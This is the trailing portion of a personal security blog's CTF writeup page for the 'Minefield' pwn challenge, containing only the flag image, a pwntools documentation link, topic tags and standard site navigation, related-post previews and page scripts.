</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/minefield/flag.png" alt="" /></p><hr /><h2 id="useful-links">Useful links</h2><ul><li><a href="https://docs.pwntools.com/en/latest/elf/elf.html#pwnlib.elf.elf.ELF.address">Pwntools documentation - ELF</a></li></ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf-writeup/'>CTF writeup</a>, <a href='/categories/pwn/'>Pwn</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >CTF</a> <a href="/tags/pwn/" class="post-tag no-text-decoration" >pwn</a> <a href="/tags/64-bit-elf/" class="post-tag no-text-decoration" >64-bit ELF</a> <a href="/tags/buffer-overflow/" class="post-tag no-text-decoration" >buffer overflow</a> <a href="/tags/bypass-canary/" class="post-tag no-text-decoration" >bypass canary</a> <a href="/tags/fini_array/" class="post-tag no-text-decoration" >fini_array</a> <a href="/tags/checksec/" class="post-tag no-text-decoration" >checksec</a> <a href="/tags/gdb-peda/" class="post-tag no-text-decoration" >gdb-peda</a> <a href="/tags/ghidra/" class="post-tag no-text-decoration" >ghidra</a> <a href="/tags/pwntools/" class="post-tag no-text-decoration" >pwntools</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Cyber Apocalypse CTF 2021 - Minefield (Pwn) - amirr0r&url=https://amirr0r.github.io/posts/cyber-apocalypse-ctf-minefield/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Cyber Apocalypse CTF 2021 - Minefield (Pwn) - amirr0r&u=https://amirr0r.github.io/posts/cyber-apocalypse-ctf-minefield/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Cyber Apocalypse CTF 2021 - Minefield (Pwn) - amirr0r&url=https://amirr0r.github.io/posts/cyber-apocalypse-ctf-minefield/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/crto-review/">CRTO Review (Certified Red Team Operator) & Notion Templates</a></li><li><a href="/posts/htb-forest/">HackTheBox - Forest</a></li><li><a href="/posts/oscp-review/">OSCP Review (Cheat Sheet, Tmux Enumeration Scripts and Notion Templates)</a></li><li><a href="/posts/oscp-prep/">How do I prepare for the OSCP?</a></li><li><a href="/posts/htb-valentine/">HackTheBox - Valentine</a></li></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/msfvenom/">msfvenom</a> <a class="post-tag" href="/tags/sudo-misconfiguration/">sudo misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">password cracking</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/meterpreter/">meterpreter</a> <a class="post-tag" href="/tags/gobuster/">gobuster</a> <a class="post-tag" href="/tags/gtfobins/">GTFOBins</a> <a class="post-tag" href="/tags/searchsploit/">searchsploit</a> <a class="post-tag" href="/tags/john-the-ripper/">John The Ripper</a> <a class="post-tag" href="/tags/powershell/">powershell</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Recommend the other 3 posts according to the tags and categories of the current post, if the number is not enough, use the other latest posts to supplement. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/cyber-apocalypse-ctf-controller/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Oct 25, 2021 <i class="unloaded">2021-10-25T15:38:11+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Cyber Apocalypse CTF 2021 - Controller (ROP)</h3><div class="text-muted small"><p> Binaries analysis controller We start by executing the file command on the two executables that were provided: 1 2 $ file controller controller: ELF 64-bit LSB executable, x86-64, version 1 (SYS...</p></div></div></a></div><div class="card"> <a href="/posts/htb-frolic/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Dec 29, 2020 <i class="unloaded">2020-12-29T21:24:41+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Frolic</h3><div class="text-muted small"><p> Foothold nmap scan $ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Frolic-full-port-scan.txt 10.10.10.111 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-buff/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Sep 7, 2021 <i class="unloaded">2021-09-07T01:49:17+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Buff</h3><div class="text-muted small"><p> Enumeration nmap scan 1 2 3 4 5 6 7 8 9 10 11 $ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Buff-full-port-scan.txt 10.10.10.198 Nmap scan report for 10.10.10.198 Host is up (0.18s latenc...</p></div></div></a></div></div></div><!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/thm-attackive-directory/" class="btn btn-outline-primary"><p>TryHackMe - Attackive directory</p></a> <a href="/posts/thm-windows-post-exploitation-basics/" class="btn btn-outline-primary"><p>TryHackMe - Windows Post-exploitation basics</p></a></div><!-- The Disqus lazy loading. Powered by: https://osvaldas.info/lazy-loading-disqus-comments v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung MIT License --><div id="disqus" class="pt-2 pb-2"><p class="font-italic text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//amirr0r-github-io.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'https://amirr0r.github.io/posts/cyber-apocalypse-ctf-minefield/'; this.page.identifier = '/posts/cyber-apocalypse-ctf-minefield/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://github.com/amirr0r">amirr0r</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/msfvenom/">msfvenom</a> <a class="post-tag" href="/tags/sudo-misconfiguration/">sudo misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">password cracking</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/meterpreter/">meterpreter</a> <a class="post-tag" href="/tags/gobuster/">gobuster</a> <a class="post-tag" href="/tags/gtfobins/">GTFOBins</a> <a class="post-tag" href="/tags/searchsploit/">searchsploit</a> <a class="post-tag" href="/tags/john-the-ripper/">John The Ripper</a> <a class="post-tag" href="/tags/powershell/">powershell</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- The GA snippet v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', '', 'auto'); ga('send', 'pageview'); </script> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://amirr0r.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
